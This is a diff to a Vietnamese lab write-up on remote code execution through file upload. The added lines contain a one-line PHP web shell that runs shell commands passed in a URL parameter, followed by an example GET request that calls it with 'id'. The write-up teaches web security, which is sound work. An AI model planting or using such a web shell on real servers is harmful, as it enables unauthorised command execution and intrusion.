@@ -60,3 +60,15 @@ _Cách 2:_
 
 Copy path `/files/avatars/exploit.php` rồi gửi thẳng qua url của web
 ![img](./../asset/file-upload-1-remote-code-execution-via-web-shell-upload5.png)
+
+**Ngoài ra còn có thể upload script như sau:**
+
+```
+<?php echo system($_GET['command']); ?>
+```
+
+> Script trên sử dụng khi ta có thể truyền tham số qua param của url:
+
+```
+GET /example/exploit.php?command=id HTTP/1.1
+```
